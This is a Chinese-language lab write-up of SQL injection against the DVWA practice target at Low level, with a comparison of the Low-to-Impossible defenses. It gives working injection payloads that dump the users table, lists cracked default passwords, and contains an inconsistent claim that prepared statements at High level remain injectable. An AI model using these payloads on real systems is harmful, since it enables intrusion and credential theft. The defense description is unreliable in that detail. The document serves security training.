# DVWA SQL注入 - Low级别实战记录

## 环境信息
- 靶场：DVWA 
- 安全级别：Low
- 时间：2026-04-08
- 攻击者：本地测试

## 攻击流程

### Step 1: 确认注入点
**输入**：`1'`
**结果**：SQL语法错误（截图保存）
**分析**：单引号破坏SQL语句结构，证明存在字符型注入漏洞

### Step 2: 获取数据库信息
**输入**：`1' UNION SELECT user(),database()#`
**结果**：
- 当前用户：dvwa@localhost
- 当前数据库：dvwa

### Step 3: 获取数据库表名
**输入**：`1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#`
**发现的关键表**：users（存储用户账号）

### Step 4: 获取用户账号密码
**输入**：`1' UNION SELECT user,password FROM users#`
**窃取的数据**：

| 用户名 | 密码哈希 | 明文密码（MD5破解） |
|--------|---------|-------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

### 漏洞根源

| 级别 | 输入方式 |	核心防御代码 |	漏洞点	| 绕过难度 |
|------|---------|-------------|----------|---------|
| Low |	$_REQUEST['id']	直接拼接SQL	无过滤，任意字符注入|	⭐ 极易 |
| Medium |	$_POST['id'] |	mysql_real_escape_string()	转义单引号，但数字型注入仍可 |	⭐⭐ 中等 |
| High |	$_SESSION['id']	预处理语句 + LIMIT 1 |	会话控制，但单条数据仍可注入 |	⭐⭐⭐ 较难 |
|Impossible |	严格类型检查 |	预处理 + CSRF Token + 强制整型 | 无漏洞 |	 ❌ 无法绕 |
## 防御机制源码对比

通过对比四个级别的源码，清晰看到防御措施的演进：

### Low级别（无防御）

$id = $_REQUEST['id'];  // 接受GET/POST/COOKIE任意来源
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
// 直接拼接，无任何过滤
漏洞：任意SQL注入，可读取/修改任意数据

### Medium级别（转义防御）
$id = $_POST['id'];  // 仅接受POST，但前端是下拉框，需抓包绕过
$id = mysql_real_escape_string($id);  // 转义特殊字符
绕过方法：使用十六进制编码或数字型注入（无需引号）

### High级别（会话+预处理）
从Session获取，限制单条返回
$id = $_SESSION['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;";
局限：单次只能查一条，但仍可通过盲注逐条获取

### Impossible级别（安全实践）

强制类型检查 + 预处理 + CSRF防护
if(!is_numeric($id)) {
    exit("Invalid ID");
}
$stmt = $pdo->prepare("SELECT ... WHERE user_id = ?");
$stmt->execute([$id]);

> **核心成果**：通过手工注入获取DVWA数据库全部5个用户账号（含admin管理员），  
> 完整分析Low→Impossible四级别防御机制，输出技术报告并提交GitHub。